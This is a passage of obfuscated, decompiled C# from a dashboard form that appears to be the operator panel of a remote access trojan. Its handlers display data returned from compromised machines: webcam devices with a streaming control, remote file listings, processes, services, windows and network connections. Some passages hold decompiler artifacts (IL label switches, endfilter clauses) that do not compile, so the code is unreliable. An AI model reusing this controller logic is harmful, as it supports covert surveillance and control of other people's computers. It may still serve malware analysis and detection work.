			this.vmethod_88().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_88().Items[0]);
			this.vmethod_250().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_250().Items[0]);
			this.vmethod_88().Enabled = true;
			this.vmethod_86().Enabled = true;
			this.vmethod_686().Enabled = true;
			this.vmethod_82().Enabled = true;
			this.vmethod_688().Enabled = true;
			this.vmethod_96().Enabled = true;
			this.vmethod_94().Enabled = true;
			this.vmethod_292().Enabled = true;
			this.vmethod_98().Enabled = true;
			this.vmethod_100().Enabled = true;
			this.vmethod_246().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_88().Items.Count > 1, true, false));
		}
	}

	// Token: 0x06000862 RID: 2146 RVA: 0x0003C0BC File Offset: 0x0003A2BC
	public void method_8(ref string string_12)
	{
		if (this.vmethod_88().InvokeRequired)
		{
			this.vmethod_88().Invoke(new fDashboard.Delegate25(this.method_8), new object[]
			{
				string_12
			});
			return;
		}
		if (string_12.Equals("0"))
		{
			Interaction.MsgBox("No webcam device found!", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_258().Enabled = true;
			return;
		}
		string[] array = Strings.Split(string_12, ":", -1, CompareMethod.Text);
		this.vmethod_268().Items.Clear();
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (array[i].Length > 0)
				{
					this.vmethod_268().Items.Add(Strings.Split(array[i], ",", -1, CompareMethod.Text)[1]);
				}
			}
			if (this.vmethod_268().Items.Count == 0)
			{
				Interaction.MsgBox("No webcam device found!", MsgBoxStyle.Exclamation, Application.ProductName);
				this.vmethod_258().Enabled = true;
				return;
			}
			this.vmethod_268().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_268().Items[0]);
			this.vmethod_716().Enabled = true;
			this.vmethod_268().Enabled = true;
			this.vmethod_258().Enabled = true;
			this.vmethod_262().Enabled = true;
		}
	}

	// Token: 0x06000863 RID: 2147 RVA: 0x0003C208 File Offset: 0x0003A408
	public void method_9(ref bool bool_3)
	{
		if (this.vmethod_262().InvokeRequired)
		{
			this.vmethod_262().Invoke(new fDashboard.Delegate17(this.method_9), new object[]
			{
				bool_3
			});
			return;
		}
		if (bool_3)
		{
			this.vmethod_262().Enabled = true;
			return;
		}
		Class130.concurrentDictionary_3[this.string_4].WEBCAM_IS_STREAMING = false;
		this.vmethod_262().Text = "Start";
		this.vmethod_262().Enabled = true;
		this.vmethod_258().Enabled = true;
		this.vmethod_268().Enabled = true;
	}

	// Token: 0x06000864 RID: 2148 RVA: 0x0003C2A8 File Offset: 0x0003A4A8
	public void method_10(ref long long_1)
	{
		if (this.vmethod_720().InvokeRequired)
		{
			this.vmethod_720().Invoke(new fDashboard.Delegate11(this.method_10), new object[]
			{
				long_1
			});
			return;
		}
		if (checked(unchecked((long)this.vmethod_408().Value) + long_1) <= (long)this.vmethod_408().Maximum)
		{
			ToolStripProgressBar toolStripProgressBar;
			(toolStripProgressBar = this.vmethod_408()).Value = checked((int)(unchecked((long)toolStripProgressBar.Value) + long_1));
		}
	}

	// Token: 0x06000865 RID: 2149 RVA: 0x0003C320 File Offset: 0x0003A520
	public void method_11(ref long long_1)
	{
		if (this.vmethod_720().InvokeRequired)
		{
			this.vmethod_720().Invoke(new fDashboard.Delegate42(this.method_11), new object[]
			{
				long_1
			});
			return;
		}
		this.vmethod_408().Value = 0;
		this.vmethod_408().Maximum = checked((int)long_1);
	}

	// Token: 0x06000866 RID: 2150 RVA: 0x0003C380 File Offset: 0x0003A580
	public void method_12(ref string string_12)
	{
		ImageList imageList = new ImageList
		{
			ImageSize = new Size(16, 16)
		};
		string text = string.Empty;
		string left = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		if (this.vmethod_720().InvokeRequired)
		{
			this.vmethod_720().Invoke(new fDashboard.Delegate9(this.method_12), new object[]
			{
				string_12
			});
			return;
		}
		checked
		{
			try
			{
				this.vmethod_474().SendToBack();
				this.vmethod_474().Visible = false;
				this.vmethod_446().Enabled = false;
				this.vmethod_448().Enabled = false;
				this.vmethod_450().Enabled = false;
				this.vmethod_696().Enabled = false;
				this.vmethod_696().Enabled = false;
				this.vmethod_696().Enabled = false;
				this.vmethod_452().Enabled = false;
				this.vmethod_454().Enabled = false;
				this.vmethod_76().Enabled = false;
				this.vmethod_76().Update();
				this.vmethod_720().Update();
				this.vmethod_76().Items.Clear();
				this.vmethod_720().Items.Clear();
				if (this.vmethod_812().Checked)
				{
					this.vmethod_720().LargeImageList = this.imageList_2;
				}
				else
				{
					this.vmethod_720().SmallImageList = imageList;
				}
				this.vmethod_76().SmallImageList = imageList;
				this.vmethod_472().MaximumValue = 1;
				this.vmethod_472().Visible = true;
				this.vmethod_408().Maximum = 1;
				List<JToken> list = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
				if (list.Count == 2)
				{
					try
					{
						foreach (JToken jtoken in list)
						{
							try
							{
								this.vmethod_398().Text = "Path: N/A";
								this.vmethod_720().Items.Clear();
								this.vmethod_76().Items.Clear();
								this.vmethod_472().Visible = false;
								this.vmethod_696().Enabled = true;
								this.vmethod_454().Enabled = true;
								this.vmethod_400().Text = "Dirs: N/A";
								this.vmethod_402().Text = "Files: N/A";
								this.vmethod_404().Text = "Objects: N/A";
								this.vmethod_406().Text = "Size: N/A";
								Interaction.MsgBox("Error: Windows cannot access the specified device or path. You may not have the appropriate permissions.\r\n\r\nDetails: " + Encoding.UTF8.GetString(Convert.FromBase64String(list[list.Count - 1]["err"].ToString())), MsgBoxStyle.Critical, Application.ProductName);
								goto IL_72D;
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						List<JToken>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
				}
				this.vmethod_472().MaximumValue = list.Count - 1;
				this.string_8 = Encoding.UTF8.GetString(Convert.FromBase64String(list[list.Count - 1]["dir"].ToString()));
				this.vmethod_404().Text = "Objects: " + list[list.Count - 1]["objects"].ToString();
				this.vmethod_402().Text = "Files: " + list[list.Count - 1]["files"].ToString();
				this.vmethod_400().Text = "Dirs: " + list[list.Count - 1]["dirs"].ToString();
				this.vmethod_406().Text = "Size: " + list[list.Count - 1]["totsize"].ToString();
				this.vmethod_398().Text = "Path: " + this.string_8;
				this.vmethod_472().Visible = true;
				this.vmethod_408().Maximum = this.vmethod_472().MaximumValue;
				this.vmethod_472().Value = 0;
				this.vmethod_408().Value = 0;
				List<ListViewItem> list2 = new List<ListViewItem>();
				List<ListViewItem> list3 = new List<ListViewItem>();
				this.vmethod_720().Items.Clear();
				try
				{
					foreach (JToken jtoken2 in list)
					{
						try
						{
							text = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken2["name"].ToString()));
							left = jtoken2["obj"].ToString();
							text2 = jtoken2["size"].ToString();
							text3 = jtoken2["mod"].ToString();
							text4 = jtoken2["type"].ToString();
							text5 = jtoken2["attr"].ToString();
							try
							{
								text6 = string.Empty;
								text6 = jtoken2["icon"].ToString();
							}
							catch (Exception ex2)
							{
							}
							if (text6.Length > 8)
							{
								byte[] array = Convert.FromBase64String(text6);
								Image image = Class136.smethod_18(ref array);
								if (this.vmethod_812().Checked)
								{
									this.imageList_2.Images.Add(text, image);
								}
								imageList.Images.Add(text, image);
							}
							ListViewItem listViewItem = new ListViewItem();
							ListViewItem listViewItem2 = new ListViewItem();
							if (Operators.CompareString(left, "dir", true) == 0)
							{
								if (text6.Length > 8)
								{
									listViewItem2.Text = text;
									listViewItem2.ImageKey = text;
								}
								else
								{
									listViewItem2.Text = text;
								}
								listViewItem2.Tag = jtoken2["path"].ToString();
								list3.Add(listViewItem2);
							}
							else
							{
								if (text6.Length > 0)
								{
									listViewItem.Text = text;
									listViewItem.ImageKey = text;
								}
								else
								{
									listViewItem.Text = text;
								}
								text7 = jtoken2["desc"].ToString();
								text7 = Encoding.UTF8.GetString(Convert.FromBase64String(text7));
								listViewItem.SubItems.Add(text7);
								listViewItem.SubItems.Add(text4);
								listViewItem.SubItems.Add(text2);
								listViewItem.SubItems.Add(text5);
								listViewItem.SubItems.Add(text3);
								listViewItem.Tag = jtoken2["path"].ToString();
								list2.Add(listViewItem);
							}
							if (this.vmethod_472().Value < this.vmethod_472().MaximumValue)
							{
								ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
								(zeroitAnidasoCircleProgress = this.vmethod_472()).Value = zeroitAnidasoCircleProgress.Value + 1;
								this.vmethod_408().Value = this.vmethod_472().Value;
							}
							Application.DoEvents();
						}
						catch (Exception ex3)
						{
						}
					}
				}
				finally
				{
					List<JToken>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
				this.vmethod_720().Items.AddRange(list2.ToArray());
				this.vmethod_76().Items.AddRange(list3.ToArray());
			}
			catch (Exception ex4)
			{
			}
			IL_72D:
			this.vmethod_472().Value = this.vmethod_472().MaximumValue;
			this.vmethod_472().Visible = false;
			if (this.string_8.Length >= 3)
			{
				this.vmethod_452().Enabled = true;
			}
			this.vmethod_446().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length > 3, true, false));
			if (this.collection_1.Count > 0)
			{
				this.vmethod_448().Enabled = true;
			}
			this.vmethod_450().Enabled = true;
			this.vmethod_452().Enabled = true;
			this.vmethod_696().Enabled = true;
			this.vmethod_454().Enabled = true;
			this.vmethod_76().Enabled = true;
			this.vmethod_720().Enabled = true;
			this.vmethod_408().Value = 0;
		}
	}

	// Token: 0x06000867 RID: 2151 RVA: 0x0003CC28 File Offset: 0x0003AE28
	public void method_13(ref string string_12, Color color_0)
	{
		if (this.vmethod_78().InvokeRequired)
		{
			this.vmethod_78().Invoke(new fDashboard.Delegate4(this.method_13), new object[]
			{
				string_12,
				color_0
			});
			return;
		}
		try
		{
			foreach (object obj in this.vmethod_78().Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (Operators.ConditionalCompareObjectEqual(listViewItem.Tag, string_12, true))
				{
					if (listViewItem.Focused)
					{
						this.vmethod_78().SelectedItems.Clear();
					}
					listViewItem.BackColor = color_0;
					break;
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000868 RID: 2152 RVA: 0x0003CCF0 File Offset: 0x0003AEF0
	public void method_14(ref string string_12, string string_13)
	{
		if (this.vmethod_578().InvokeRequired)
		{
			this.vmethod_578().Invoke(new fDashboard.Delegate7(this.method_14), new object[]
			{
				string_12,
				string_13
			});
			return;
		}
		try
		{
			foreach (object obj in this.vmethod_578().Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (Operators.CompareString(listViewItem.Text, string_12, true) == 0)
				{
					Color backColor;
					if (Operators.CompareString(string_13, "1", true) == 0)
					{
						backColor = Color.Red;
						string_13 = "Stopped";
					}
					else if (Operators.CompareString(string_13, "2", true) == 0)
					{
						backColor = Color.DeepSkyBlue;
						string_13 = "Paused";
					}
					else if (Operators.CompareString(string_13, "3", true) == 0)
					{
						backColor = Color.LimeGreen;
						string_13 = "Started";
					}
					else if (Operators.CompareString(string_13, "4", true) == 0)
					{
						backColor = Color.Red;
						string_13 = "Uninstalled";
					}
					if (listViewItem.Focused)
					{
						this.vmethod_578().SelectedItems.Clear();
					}
					if (string_13.Length > 0)
					{
						listViewItem.SubItems[3].Text = string_13;
					}
					listViewItem.BackColor = backColor;
					break;
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000869 RID: 2153 RVA: 0x0003CE4C File Offset: 0x0003B04C
	public void method_15(ref string string_12, string string_13)
	{
		if (this.vmethod_624().InvokeRequired)
		{
			this.vmethod_624().Invoke(new fDashboard.Delegate39(this.method_15), new object[]
			{
				string_12,
				string_13
			});
			return;
		}
		try
		{
			foreach (object obj in this.vmethod_624().Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (Operators.CompareString(listViewItem.SubItems[2].Text, string_12, true) == 0)
				{
					Color backColor;
					if (Operators.CompareString(string_13, "0", true) == 0)
					{
						backColor = Color.Red;
					}
					else if (Operators.CompareString(string_13, "1", true) == 0)
					{
						backColor = Color.LimeGreen;
					}
					if (listViewItem.Focused)
					{
						this.vmethod_624().SelectedItems.Clear();
					}
					listViewItem.BackColor = backColor;
					break;
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x0600086A RID: 2154 RVA: 0x0003CF44 File Offset: 0x0003B144
	public void method_16(ref string string_12)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string value = string.Empty;
		string text6 = string.Empty;
		ImageList imageList = new ImageList
		{
			ImageSize = new Size(16, 16)
		};
		if (this.vmethod_78().InvokeRequired)
		{
			this.vmethod_78().Invoke(new fDashboard.Delegate34(this.method_16), new object[]
			{
				string_12
			});
			return;
		}
		List<ListViewItem> list = new List<ListViewItem>();
		this.vmethod_78().Items.Clear();
		this.vmethod_78().SmallImageList = imageList;
		this.vmethod_134().Value = 0;
		this.vmethod_134().Maximum = 1;
		this.vmethod_120().MaximumValue = 1;
		this.vmethod_120().Visible = true;
		checked
		{
			List<JToken> list2 = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
			this.vmethod_120().MaximumValue = list2.Count - 1;
			this.vmethod_120().Value = 0;
			this.vmethod_134().Maximum = this.vmethod_120().MaximumValue;
			string str = list2[list2.Count - 1]["cpuusage"].ToString();
			string str2 = list2[list2.Count - 1]["ramsize"].ToString();
			string str3 = list2[list2.Count - 1]["ramfree"].ToString();
			string str4 = list2[list2.Count - 1]["ramload"].ToString();
			this.vmethod_124().Text = "Processes: " + Conversions.ToString(list2.Count - 1);
			this.vmethod_126().Text = "CPU Usage: " + str;
			this.vmethod_128().Text = "RAM Size: " + str2;
			this.vmethod_130().Text = "RAM Available: " + str3;
			this.vmethod_132().Text = "RAM Load: " + str4;
			this.vmethod_508().SendToBack();
			this.vmethod_508().Visible = false;
			try
			{
				foreach (JToken jtoken in list2)
				{
					try
					{
						ListViewItem listViewItem = new ListViewItem();
						text = jtoken["name"].ToString();
						text2 = jtoken["path"].ToString();
						text3 = jtoken["pid"].ToString();
						text4 = jtoken["threads"].ToString();
						text5 = jtoken["mem"].ToString();
						jtoken["isprc"].ToString();
						value = jtoken["pri"].ToString();
						byte[] array = Convert.FromBase64String(jtoken["icon"].ToString());
						Image image = Class136.smethod_18(ref array);
						imageList.Images.Add(text3, image);
						text6 = jtoken["desc"].ToString();
						text6 = Encoding.UTF8.GetString(Convert.FromBase64String(text6));
						listViewItem.Text = text;
						listViewItem.ImageKey = text3;
						listViewItem.SubItems.Add(text6);
						listViewItem.SubItems.Add(text2);
						listViewItem.SubItems.Add(text3);
						listViewItem.SubItems.Add(text4);
						listViewItem.SubItems.Add(text5);
						listViewItem.SubItems.Add(Class136.smethod_19(Conversions.ToInteger(value)));
						listViewItem.Tag = text3;
						if (Operators.CompareString(text3, Class130.concurrentDictionary_3[this.string_4].sPID, true) == 0)
						{
							listViewItem.BackColor = Color.DeepSkyBlue;
						}
						list.Add(listViewItem);
						if (this.vmethod_120().Value < this.vmethod_120().MaximumValue)
						{
							ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
							(zeroitAnidasoCircleProgress = this.vmethod_120()).Value = zeroitAnidasoCircleProgress.Value + 1;
							ToolStripProgressBar toolStripProgressBar;
							(toolStripProgressBar = this.vmethod_134()).Value = toolStripProgressBar.Value + 1;
						}
					}
					catch (Exception ex)
					{
					}
					Application.DoEvents();
				}
			}
			finally
			{
				List<JToken>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.vmethod_120().Value = this.vmethod_120().MaximumValue;
			this.vmethod_120().Visible = false;
			this.vmethod_78().Enabled = true;
			this.vmethod_78().Items.AddRange(list.ToArray());
			this.vmethod_134().Value = 0;
		}
	}

	// Token: 0x0600086B RID: 2155 RVA: 0x0003D414 File Offset: 0x0003B614
	public void method_17(ref string string_12)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		string text8 = string.Empty;
		string text9 = string.Empty;
		if (this.vmethod_578().InvokeRequired)
		{
			this.vmethod_578().Invoke(new fDashboard.Delegate20(this.method_17), new object[]
			{
				string_12
			});
			return;
		}
		List<ListViewItem> list = new List<ListViewItem>();
		this.vmethod_578().Items.Clear();
		this.vmethod_574().Value = 0;
		this.vmethod_574().Maximum = 1;
		this.vmethod_576().MaximumValue = 1;
		this.vmethod_576().Visible = true;
		checked
		{
			List<JToken> list2 = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
			this.vmethod_576().MaximumValue = list2.Count - 1;
			this.vmethod_576().Value = 0;
			this.vmethod_574().Maximum = this.vmethod_576().MaximumValue;
			this.vmethod_570().Text = "Services: " + Conversions.ToString(list2.Count);
			this.vmethod_566().SendToBack();
			this.vmethod_566().Visible = false;
			long num;
			long num2;
			try
			{
				foreach (JToken jtoken in list2)
				{
					try
					{
						ListViewItem listViewItem = new ListViewItem();
						text = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["name"].ToString()));
						text2 = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["disp"].ToString()));
						text3 = jtoken["pid"].ToString();
						text4 = jtoken["status"].ToString();
						text5 = jtoken["startup"].ToString();
						text6 = jtoken["type"].ToString();
						text7 = jtoken["err"].ToString();
						text8 = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["path"].ToString()));
						text9 = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["dep"].ToString()));
						if (Operators.CompareString(text4, "Running", true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(text4, "Stopped", true) == 0)
						{
							num2 += 1L;
						}
						listViewItem.Text = text;
						listViewItem.SubItems.Add(text2);
						listViewItem.SubItems.Add(text3);
						listViewItem.SubItems.Add(text4);
						listViewItem.SubItems.Add(text5);
						listViewItem.SubItems.Add(text6);
						listViewItem.SubItems.Add(text7);
						listViewItem.SubItems.Add(text8);
						listViewItem.SubItems.Add(text9);
						list.Add(listViewItem);
						if (this.vmethod_576().Value < this.vmethod_576().MaximumValue)
						{
							ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
							(zeroitAnidasoCircleProgress = this.vmethod_576()).Value = zeroitAnidasoCircleProgress.Value + 1;
							ToolStripProgressBar toolStripProgressBar;
							(toolStripProgressBar = this.vmethod_574()).Value = toolStripProgressBar.Value + 1;
						}
					}
					catch (Exception ex)
					{
					}
					Application.DoEvents();
				}
			}
			finally
			{
				List<JToken>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.vmethod_572().Text = "Running: " + Conversions.ToString(num);
			this.vmethod_664().Text = "Stopped: " + Conversions.ToString(num2);
			this.vmethod_576().Value = this.vmethod_576().MaximumValue;
			this.vmethod_576().Visible = false;
			this.vmethod_578().Enabled = true;
			this.vmethod_578().Items.AddRange(list.ToArray());
			this.vmethod_574().Value = 0;
		}
	}

	// Token: 0x0600086C RID: 2156 RVA: 0x0003D850 File Offset: 0x0003BA50
	public void method_18(ref string string_12)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		if (this.vmethod_624().InvokeRequired)
		{
			this.vmethod_624().Invoke(new fDashboard.Delegate5(this.method_18), new object[]
			{
				string_12
			});
			return;
		}
		List<ListViewItem> list = new List<ListViewItem>();
		this.vmethod_624().Items.Clear();
		this.vmethod_620().Value = 0;
		this.vmethod_620().Maximum = 1;
		this.vmethod_622().MaximumValue = 1;
		this.vmethod_622().Visible = true;
		checked
		{
			List<JToken> list2 = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
			this.vmethod_622().MaximumValue = list2.Count - 1;
			this.vmethod_622().Value = 0;
			this.vmethod_620().Maximum = this.vmethod_622().MaximumValue;
			this.vmethod_618().Text = "Windows: " + Conversions.ToString(list2.Count);
			this.vmethod_614().SendToBack();
			this.vmethod_614().Visible = false;
			try
			{
				foreach (JToken jtoken in list2)
				{
					try
					{
						ListViewItem listViewItem = new ListViewItem();
						text = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["title"].ToString()));
						text2 = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["class"].ToString()));
						text3 = jtoken["hwnd"].ToString();
						text4 = jtoken["size"].ToString();
						text5 = jtoken["state"].ToString();
						listViewItem.Text = text;
						listViewItem.SubItems.Add(text2);
						listViewItem.SubItems.Add(text3);
						listViewItem.SubItems.Add(text4);
						listViewItem.SubItems.Add(text5);
						list.Add(listViewItem);
						if (this.vmethod_622().Value < this.vmethod_622().MaximumValue)
						{
							ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
							(zeroitAnidasoCircleProgress = this.vmethod_622()).Value = zeroitAnidasoCircleProgress.Value + 1;
							ToolStripProgressBar toolStripProgressBar;
							(toolStripProgressBar = this.vmethod_620()).Value = toolStripProgressBar.Value + 1;
						}
					}
					catch (Exception ex)
					{
					}
					Application.DoEvents();
				}
			}
			finally
			{
				List<JToken>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.vmethod_622().Value = this.vmethod_622().MaximumValue;
			this.vmethod_622().Visible = false;
			this.vmethod_624().Enabled = true;
			this.vmethod_624().Items.AddRange(list.ToArray());
			this.vmethod_620().Value = 0;
		}
	}

	// Token: 0x0600086D RID: 2157 RVA: 0x0003DB60 File Offset: 0x0003BD60
	public void method_19(ref string string_12)
	{
		ImageList imageList = new ImageList
		{
			ImageSize = new Size(16, 16)
		};
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		string text8 = string.Empty;
		string tag = string.Empty;
		string text9 = string.Empty;
		if (this.vmethod_718().InvokeRequired)
		{
			this.vmethod_718().Invoke(new fDashboard.Delegate32(this.method_19), new object[]
			{
				string_12
			});
			return;
		}
		checked
		{
			try
			{
				this.vmethod_718().Enabled = false;
				this.vmethod_718().Items.Clear();
				this.vmethod_718().SmallImageList = imageList;
				this.vmethod_364().MaximumValue = 1;
				this.vmethod_364().Visible = true;
				this.vmethod_512().SendToBack();
				this.vmethod_512().Visible = false;
				this.vmethod_506().Maximum = 1;
				List<JToken> list = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
				this.vmethod_364().MaximumValue = list.Count - 1;
				this.vmethod_496().Text = "Endpoints: " + list[list.Count - 1]["endpoints"].ToString();
				this.vmethod_498().Text = "TCP: " + list[list.Count - 1]["tcp"].ToString();
				this.vmethod_500().Text = "UDP: " + list[list.Count - 1]["udp"].ToString();
				this.vmethod_502().Text = "Established: " + list[list.Count - 1]["est"].ToString();
				this.vmethod_504().Text = "Listening: " + list[list.Count - 1]["lis"].ToString();
				this.vmethod_506().Maximum = this.vmethod_364().MaximumValue;
				this.vmethod_364().Value = 0;
				this.vmethod_506().Value = 0;
				List<ListViewItem> list2 = new List<ListViewItem>();
				try
				{
					foreach (JToken jtoken in list)
					{
						try
						{
							text = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["pname"].ToString()));
							text2 = jtoken["pid"].ToString();
							text3 = jtoken["protocol"].ToString();
							text4 = jtoken["laddr"].ToString();
							text5 = jtoken["lport"].ToString();
							text6 = jtoken["raddr"].ToString();
							text7 = jtoken["rport"].ToString();
							text8 = jtoken["state"].ToString();
							tag = Encoding.UTF8.GetString(Convert.FromBase64String(jtoken["condata"].ToString()));
							try
							{
								text9 = string.Empty;
								text9 = jtoken["icon"].ToString();
							}
							catch (Exception ex)
							{
							}
							if (text9.Length > 8)
							{
								byte[] array = Convert.FromBase64String(text9);
								Image image = Class136.smethod_18(ref array);
								imageList.Images.Add(text, image);
							}
							ListViewItem listViewItem = new ListViewItem();
							new ListViewItem();
							if (text9.Length > 0)
							{
								listViewItem.Text = text;
								listViewItem.ImageKey = text;
							}
							else
							{
								listViewItem.Text = text;
							}
							if (Operators.CompareString(text2, Class130.concurrentDictionary_3[this.string_4].sPID, true) == 0)
							{
								listViewItem.BackColor = Color.DeepSkyBlue;
							}
							listViewItem.Text = text;
							listViewItem.SubItems.Add(text2);
							listViewItem.SubItems.Add(text3);
							listViewItem.SubItems.Add(text4);
							listViewItem.SubItems.Add(text5);
							listViewItem.SubItems.Add(text6);
							listViewItem.SubItems.Add(text7);
							listViewItem.SubItems.Add(text8);
							listViewItem.Tag = tag;
							list2.Add(listViewItem);
							if (this.vmethod_364().Value < this.vmethod_364().MaximumValue)
							{
								ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
								(zeroitAnidasoCircleProgress = this.vmethod_364()).Value = zeroitAnidasoCircleProgress.Value + 1;
								this.vmethod_506().Value = this.vmethod_364().Value;
							}
							Application.DoEvents();
						}
						catch (Exception ex2)
						{
						}
					}
				}
				finally
				{
					List<JToken>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.vmethod_718().Items.AddRange(list2.ToArray());
				try
				{
					foreach (object obj in this.vmethod_718().Columns)
					{
						((ColumnHeader)obj).Tag = SortOrder.None;
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex3)
			{
			}
			this.vmethod_364().Value = this.vmethod_364().MaximumValue;
			this.vmethod_364().Visible = false;
			this.vmethod_718().Enabled = true;
			this.vmethod_506().Value = 0;
		}
	}

	// Token: 0x0600086E RID: 2158 RVA: 0x0003E160 File Offset: 0x0003C360
	private void method_20(object sender, EventArgs e)
	{
		this.vmethod_552().Enabled = false;
		this.vmethod_552().Items.Clear();
		this.vmethod_554().BringToFront();
		this.vmethod_554().Visible = true;
		string text = this.string_4;
		string text2 = "info|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600086F RID: 2159 RVA: 0x0003E218 File Offset: 0x0003C418
	private void method_21(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_552().Items.Count != 0)
			{
				string text = null;
				GClass7 gclass = this.vmethod_552();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text += gclass.Items[i].Text;
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							text = text + "\t" + gclass.Items[i].SubItems[j].Text;
						}
						text += "\r\n";
					}
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x06000870 RID: 2160 RVA: 0x0003E30C File Offset: 0x0003C50C
	public void method_22(ref string string_12)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			if (!this.vmethod_552().InvokeRequired)
			{
				goto IL_40;
			}
			IL_16:
			num2 = 3;
			this.vmethod_552().Invoke(new fDashboard.Delegate35(this.method_22), new object[]
			{
				string_12
			});
			goto IL_137;
			IL_40:
			num2 = 5;
			this.vmethod_554().SendToBack();
			IL_4D:
			num2 = 6;
			this.vmethod_554().Visible = false;
			IL_5B:
			num2 = 7;
			if (string_12.Length < 3)
			{
				goto IL_137;
			}
			IL_6A:
			num2 = 9;
			JObject jobject = JObject.Parse(string_12.Substring(7, checked(string_12.Length - 8)));
			IL_85:
			num2 = 10;
			IL_88:
			num2 = 11;
			List<JToken> list = jobject["block"].ToList<JToken>();
			IL_9E:
			num2 = 12;
			this.vmethod_552().Items.Clear();
			IL_B1:
			num2 = 13;
			List<JToken>.Enumerator enumerator = list.GetEnumerator();
			while (enumerator.MoveNext())
			{
				JToken jtoken = enumerator.Current;
				IL_C7:
				num2 = 14;
				this.vmethod_552().Items.Add(new ListViewItem(new string[]
				{
					jtoken["val1"].ToString(),
					jtoken["val2"].ToString()
				}));
				IL_10C:
				num2 = 15;
			}
			IL_118:
			num2 = 16;
			((IDisposable)enumerator).Dispose();
			IL_128:
			num2 = 17;
			this.vmethod_552().Enabled = true;
			IL_137:
			goto IL_1D1;
			IL_13C:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_192:
			goto IL_1C6;
			IL_194:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_1A4:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_194;
		}
		IL_1C6:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_1D1:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000871 RID: 2161 RVA: 0x0003E510 File Offset: 0x0003C710
	public void method_23(ref string[] string_12)
	{
		this.imageList_3 = new ImageList
